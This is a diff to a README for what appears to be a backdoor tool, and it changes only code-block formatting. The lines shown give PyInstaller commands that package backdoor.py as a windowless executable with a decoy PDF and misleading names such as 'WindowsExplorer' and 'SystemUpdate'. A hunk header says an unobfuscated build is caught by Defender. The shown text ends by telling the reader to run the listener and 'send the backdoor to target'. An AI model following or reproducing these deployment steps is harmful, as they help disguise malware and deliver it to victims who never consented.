@@ -24,26 +24,26 @@ Unobfuscated backdoor will be detected and quarintined by defender
 
 2. ### find your pyinstaller path and run :
 #### For windows :
-    ```shell
+```powershell
     C:\Users\wherever\your\path\is\pyinstaller.exe --onefile --noconsole --name "WindowsExplorer" --icon="icon.ico" --add-data "sample.pdf;." backdoor.py
-    ```
+```
   
 #### For MacOS :    
-```powershell
+```zsh
     /Users/path/to/pyinstaller --onefile --windowed --name "SystemUpdate" --icon="icon.icns" --add-data "sample.pdf:." backdoor.py
 ```
 
 #### For Linux :
-    ```
+```shell
     pyinstaller --onefile --noconsole --name "sysupdate" --icon="icon.png" --add-data "sample.pdf:." backdoor.py
-    ```
+```
 
    If ran successfully the created executable will be in your newly created "Dist" directory
 
  5. ### Generate cerificates for SSL encryption (Do this in same directory as listener.py) :
-    ```
+```shell
     openssl req -new -x509 -days 365 -nodes -out cert.pem -keyout key.pem
-    ```
+```
 
 4. ### Run Listener is your machine and send the backdoor to target
    ```zsh
